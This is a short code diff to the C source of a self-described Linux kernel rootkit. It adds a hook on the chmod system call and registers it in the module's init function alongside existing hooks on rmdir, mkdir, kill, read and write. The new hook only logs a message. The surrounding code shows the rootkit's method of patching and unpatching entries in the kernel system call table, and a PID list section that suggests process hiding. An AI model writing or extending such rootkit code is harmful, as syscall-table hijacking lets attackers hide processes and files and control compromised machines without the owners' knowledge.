@@ -475,7 +475,7 @@ asmlinkage long asm_rmdir(const char __user *pathname)
  * New hooked functions:
  * - mkdir
  * - kill
- *
+ * - chmod
 */
 asmlinkage long asm_mkdir(const char __user *pathname)
 {
@@ -497,6 +497,15 @@ asmlinkage long asm_kill(const char __user *pathname)
     return ret;
 }
 
+asmlinkage long asm_chmod(const char __user *pathname)
+{
+    asmlinkage long (*original_chmod)(const char __user *);
+    original_chmod = asm_hook_unpatch(asm_chmod);
+    long ret = original_chmod(pathname);
+    asm_hook_patch(asm_chmod);
+    pr_info("Hello world from rootkit chmod!\n");
+    return ret;
+}
 // ========== END NEW HOOKED FUNCTIONS ==============
 
 // ========== PID LIST ==========
@@ -1179,6 +1188,7 @@ int init(void)
     asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
     asm_hook_create(sys_call_table[__NR_mkdir], asm_mkdir);
     asm_hook_create(sys_call_table[__NR_kill], asm_kill);
+    asm_hook_create(sys_call_table[__NR_chmod], asm_chmod);
 
     /* Hook read() and write() syscalls with our own */
     hook_create(&sys_call_table[__NR_read], read);
